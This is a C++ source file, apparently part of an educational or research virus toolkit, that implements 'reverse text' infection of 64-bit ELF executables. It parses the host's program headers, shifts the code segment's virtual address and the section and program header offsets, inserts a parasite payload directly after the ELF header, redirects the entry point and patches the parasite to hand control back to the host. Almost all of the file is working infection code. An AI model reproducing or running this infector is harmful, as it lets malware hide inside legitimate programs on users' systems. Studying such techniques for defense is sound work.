#include "infector/reverse_text_infect.hh"
#include <linux/elf.h>
#include <linux/limits.h>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/patch_relinguish_control.hh"
#include "std/string.hh"

namespace vt::infector {
namespace {
struct ElfReverseTextInfo {
  Elf64_Addr original_code_segment_p_vaddr;
  size_t code_segment_idx;
};

// uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & (~0b11)) + 4; }
uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }

bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
               size_t parasite_size, Elf64_Addr original_text_segment_vaddr) {
  auto base = output_mapping.mutable_base();
  auto elf_header = reinterpret_cast<const Elf64_Ehdr*>(base);

  auto sht_offset = elf_header->e_shoff;
  auto sht_entry_count = elf_header->e_shnum;
  const auto extra_space = round_up_to_page(parasite_size);

  // Point shdr (Pointer to iterate over SHT)
  auto section_entry = reinterpret_cast<Elf64_Shdr*>(base + sht_offset);

  /*
  auto* string_table = output_mapping.base() +
                       (section_entry + elf_header->e_shstrndx)->sh_offset;
  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto cur_entry = section_entry + i;
    if (!strncmp(string_table + cur_entry->sh_name, ".text", 5)) {
      // patch .text file offset to where virus starts, which is right after
      // ehdr.
      cur_entry->sh_offset = sizeof(Elf64_Ehdr);
      //cur_entry->sh_addr = sizeof(Elf64_Ehdr);
      cur_entry->sh_size += parasite_size;
      printf("patching text section hdr\n");
    } else if (cur_entry->sh_offset) {
      // Shift all sections behind, except the first null section.
      cur_entry->sh_offset += extra_space;
      //cur_entry->sh_addr += extra_space;
    }
  }
  return true;
 */
  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto cur_entry = section_entry + i;
    cur_entry->sh_offset += extra_space;
  }
  return true;
}

void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                uint64_t parasite_size, size_t code_segment_idx) {
  auto elf_header = (Elf64_Ehdr*)host_mapping.mutable_base();
  Elf64_Off pht_offset = elf_header->e_phoff;
  auto pht_entry_count = elf_header->e_phnum;

  // Point to first phdr
  auto phdr_entry = (Elf64_Phdr*)(host_mapping.mutable_base() + pht_offset);

  auto extra_space = round_up_to_page(parasite_size);

  // For other entries that has p_offset after CODE segment, shift them.
  for (size_t idx = 0; idx < pht_entry_count; idx++) {
    auto cur_entry = phdr_entry + idx;
    if (idx == code_segment_idx) {
      // RX segment loads from offset 0 to the end of all CODE sections.
      // It includes ehdr, virus, phdr and executable sections. Therefore we
      // don't need to shift the file offset here.
      if (cur_entry->p_vaddr) {
        cur_entry->p_vaddr -= extra_space;
      }
      if (cur_entry->p_paddr) {
        cur_entry->p_paddr -= extra_space;
      }

      cur_entry->p_filesz += extra_space;
      cur_entry->p_memsz += extra_space;
    } else if (cur_entry->p_offset) {
      // shift file offset for all other segments execept special ones like
      // GNU_STACK.
      cur_entry->p_offset += extra_space;
    }
  }
}

Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                      const ElfReverseTextInfo& info, uint64_t parasite_size) {
  Elf64_Ehdr* header =
      reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
  Elf64_Addr original_entry_point = header->e_entry;

  if (header->e_type == ET_EXEC) {
    header->e_entry = info.original_code_segment_p_vaddr -
                      round_up_to_page(parasite_size) + sizeof(Elf64_Ehdr);
    printf("entry %x\n", header->e_entry);
  } else if (header->e_type == ET_DYN) {
    header->e_entry = sizeof(Elf64_Ehdr);
  } else {
    CHECK_FAIL();
  }
  auto extra_space = round_up_to_page(parasite_size);
  header->e_shoff += extra_space;
  header->e_phoff += extra_space;
  return original_entry_point;
}

bool get_info(const char* host_mapping, uint64_t parasite_size,
              ElfReverseTextInfo& info) {
  auto elf_header = (const Elf64_Ehdr*)host_mapping;
  auto pht_entry_count = elf_header->e_phnum;
  Elf64_Off pht_offset = elf_header->e_phoff;

  // Point to first entry in PHT
  auto phdr_entry = (const Elf64_Phdr*)(host_mapping + pht_offset);

  // Parse PHT entries
  for (size_t i = 0; i < pht_entry_count; ++i, ++phdr_entry) {
    // Find the CODE Segment (containing RX section)
    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
      info.code_segment_idx = i;
      info.original_code_segment_p_vaddr = phdr_entry->p_vaddr;
      return true;
    }
  }

  return false;
}

}  // namespace

bool reverse_text_infect64(
    vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
    vt::common::Mmap<PROT_READ> parasite_mapping) {
  const Elf64_Ehdr* host_header =
      reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE) {
    return false;
  }
  if (host_header->e_ident[EI_CLASS] == ELFCLASS32) {
    return false;
  }

  ElfReverseTextInfo info{};
  // Get padding size in host.
  if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
    printf("Cannot correctly parse host elf phdr\n");
    return false;
  }
  printf("get_info done\n");

  // Patch program header table and increase text section size.
  patch_phdr(host_mapping, parasite_mapping.size(), info.code_segment_idx);

  patch_sht(host_mapping, parasite_mapping.size(),
            info.original_code_segment_p_vaddr);

  // Patch elf header last
  auto original_entry_point =
      patch_ehdr(host_mapping, info, parasite_mapping.size());

  // Shift host content back, starting from the end of ehdr to make room for
  // virus.
  auto extra_space = round_up_to_page(parasite_mapping.size());
  printf("host size %x extra space %x\n", host_mapping.size(), extra_space);
  memcpy(host_mapping.mutable_base() + sizeof(Elf64_Ehdr) + extra_space,
         host_mapping.mutable_base() + sizeof(Elf64_Ehdr),
         host_mapping.size() - extra_space - sizeof(Elf64_Ehdr));
  // Clear old content. Not required.
  memset(host_mapping.mutable_base() + sizeof(Elf64_Ehdr), 0x00, extra_space);

  // Inject the virus.
  memcpy(host_mapping.mutable_base() + sizeof(Elf64_Ehdr),
         parasite_mapping.base(), parasite_mapping.size());

  // Patch parasite to resume host code after execution.
  return patch_parasite_and_relinquish_control(
      host_header->e_type, original_entry_point, host_header->e_entry,
      sizeof(elf64_hdr), parasite_mapping.size(), host_mapping);
}

size_t ReverseTextInfect::output_size(size_t host_size, size_t parasite_size) {
  return host_size + round_up_to_page(parasite_size);
}

}  // namespace vt::infector